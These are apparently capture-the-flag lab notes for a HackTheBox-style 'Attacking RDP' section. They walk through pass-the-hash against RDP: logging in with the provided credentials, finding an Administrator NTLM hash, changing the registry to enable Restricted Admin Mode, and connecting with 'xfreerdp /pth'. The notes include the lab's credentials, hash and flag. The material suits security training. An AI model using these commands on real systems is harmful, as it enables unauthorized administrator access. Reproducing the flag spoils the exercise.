## ID
111

## Module
Attacking Common Services

## Kind
notes

## Title
Section 11 — Attacking RDP

## Description
Gain initial RDP access with provided credentials, find a file containing an NTLM hash, enable Restricted Admin Mode via registry, then perform Pass‑the‑Hash (PtH) to connect as Administrator and retrieve the flag.

## Tags
rdp, pass-the-hash, ntlm, xfreerdp, registry, restricted-admin

## Commands
- xfreerdp /v:<TARGET> /u:<USER> /p:'<PASS>' /cert:ignore
- reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
- xfreerdp /v:<TARGET> /u:<USER> /pth:<NTLM_HASH> /cert:ignore
- cat <FILE>

## What This Section Covers
RDP (Remote Desktop Protocol) can be attacked by first authenticating with low‑privileged credentials, discovering an NTLM hash stored in a file, enabling the `DisableRestrictedAdmin` registry key (required for PtH), and then using Pass‑the‑Hash to connect as a different user (Administrator) to retrieve the flag.

## Methodology

1. **Initial RDP connection** – Use provided credentials (`htb-rdp` / `HTBRocks!`) to log in.
2. **Locate the file on the Desktop** – Find `pentest-notes.txt` (or similar) containing an NTLM hash for Administrator.
3. **Enable Restricted Admin Mode** – On the target (from the first RDP session), add the registry key `DisableRestrictedAdmin` with value `0x0`.
4. **Perform Pass‑the‑Hash** – From your attack box, use `xfreerdp` with the `/pth` flag and the captured NTLM hash to connect as Administrator.
5. **Retrieve the flag** – On the Administrator’s Desktop, read `flag.txt`.

## Multi‑step Workflow

```bash
# Step 1 – Initial RDP as htb-rdp
xfreerdp /v:10.129.203.13 /u:htb-rdp /p:'HTBRocks!' /cert:ignore

# Inside the RDP session, navigate to Desktop and find the file
# The file is pentest-notes.txt
# Its contents: User: Administrator, Hash: 0E14B9D6330BF16C30B1924111104824

# Step 2 – Enable Restricted Admin Mode (from the same RDP session, run as admin)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Step 3 – From your attack box, PtH as Administrator
xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /cert:ignore

# Step 4 – Inside the new RDP session, open flag.txt on the Desktop
# Flag: HTB{RDP_P4$$_Th3_H4$#}

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|common-services]]  
← [[08-smb-latest-vulns]] | [[13-attacking-dns]] →
<!-- AUTO-LINKS-END -->
